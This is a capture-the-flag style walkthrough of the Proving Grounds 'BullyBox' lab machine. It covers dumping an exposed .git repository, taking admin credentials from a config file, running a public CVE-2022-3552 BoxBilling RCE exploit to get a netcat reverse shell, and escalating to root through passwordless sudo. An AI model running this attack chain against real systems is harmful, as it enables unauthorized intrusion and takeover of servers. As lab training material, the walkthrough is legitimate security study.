# BullyBox — Proving Grounds

> [!abstract] Summary
> BullyBox runs a BoxBilling application behind Apache on port 80, with SSH on 22. Nmap's script scan reveals an **exposed `.git` repository** and a `robots.txt` listing BoxBilling internal paths. Dumping the Git repository with `git-dumper` recovers `bb-config.php`, which contains the database credentials `admin` / `Playing-Unstylish7-Provided` and the admin panel path `/bb-admin`. Logging into the BoxBilling admin panel with these credentials enables exploitation of **CVE-2022-3552** — an authenticated RCE through Twig template injection. The reverse shell lands as a user with **`sudo NOPASSWD: ALL`**, making privilege escalation to root trivial with `sudo -i`.

**Target:** `192.168.143.27`

## Methodology

1. Port scan — SSH (22) and HTTP (80).
2. Add `bullybox.local` to `/etc/hosts` (redirect detected).
3. Discover exposed `.git` directory via Nmap scripts.
4. Dump the Git repository with `git-dumper`.
5. Extract admin credentials from `bb-config.php`.
6. Log into BoxBilling admin panel at `/bb-admin`.
7. Register a customer account and create an order (exploit prerequisite).
8. Exploit CVE-2022-3552 (BoxBilling authenticated RCE via Twig templates).
9. Catch reverse shell → `sudo -l` reveals `NOPASSWD: ALL` → `sudo -i` → root.

## Initial Foothold

### Dumping the Exposed Git Repository

The exposed `.git` directory is the critical finding. Install and run `git-dumper`:

```
pip install git-dumper
```

```

```

Navigate into the dumped repository and search for credentials:

```
cd bullybox
grep -RniE 'password|username|admin|dbuser' .
```

### Preparing for Exploitation (Prerequisite)

The CVE-2022-3552 exploit requires **at least one order to exist** in the system.

Register a normal customer account on the BoxBilling frontend and complete an order before running the exploit.

### Exploiting CVE-2022-3552 — BoxBilling Authenticated RCE

The vulnerable BoxBilling version is affected by **CVE-2022-3552**, an authenticated remote code execution through Twig template injection.

Clone the exploit:

```
git clone https://github.com/0xk4b1r/CVE-2022-3552.git
cd CVE-2022-3552
```

The exploit requires Pwntools. Install it if not already present:

```
sudo apt update
sudo apt install python3-pwntools -y
```

Verify the installation:

```
python3 -c "from pwn import *; print('Pwntools installed successfully')"
```

Start a Netcat listener:

```
nc -lvnp 6969
```

Find your VPN IP:

```
ip -br addr
```

Run the exploit:

```
python3 CVE-2022-3552.py \
-d http://bullybox.local \
-u 'admin@bullybox.local' \
-p 'Playing-Unstylish7-Provided'
```

> [!note]
> The exploit will prompt for your callback IP and port. Enter your Kali VPN IP and `6969` (or whichever port your listener is on).

The exploit should establish a reverse shell on the listener.

## Privilege Escalation

### Shell Enumeration

After catching the reverse shell:

```
whoami
id
hostname
```

Check sudo permissions:

```
sudo -l
```

The key discovery — unrestricted passwordless sudo:

```
(ALL : ALL) NOPASSWD: ALL
```

This means the compromised account can execute any command as any user, including root, without a password.

### Escalation to Root

```
sudo -i
```

Verify:

```
whoami
```

Expected output:

```
root
```

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | Nmap script scan | Nmap's `http-git` script automatically detects exposed Git repositories |
| Information Disclosure | git-dumper | Exposed `.git` directories leak the entire source code and history |
| Credential Discovery | Configuration file analysis | Application config files (`bb-config.php`) often contain database and admin credentials |
| Initial Access | CVE-2022-3552 | BoxBilling authenticated RCE via Twig template injection |
| Privilege Escalation | `sudo NOPASSWD: ALL` | Misconfigured sudo grants immediate root access |

- **Always check for exposed `.git` directories** during web enumeration — they are one of the most impactful information disclosure findings.
- **Inspect Git history**, not just the latest source code. Sensitive data may have been committed and later removed.
- **Check exploit prerequisites** before launching an exploit — CVE-2022-3552 requires at least one order to exist.
- **Always run `sudo -l`** immediately after obtaining a Linux shell — it's the quickest path to root when misconfigured.
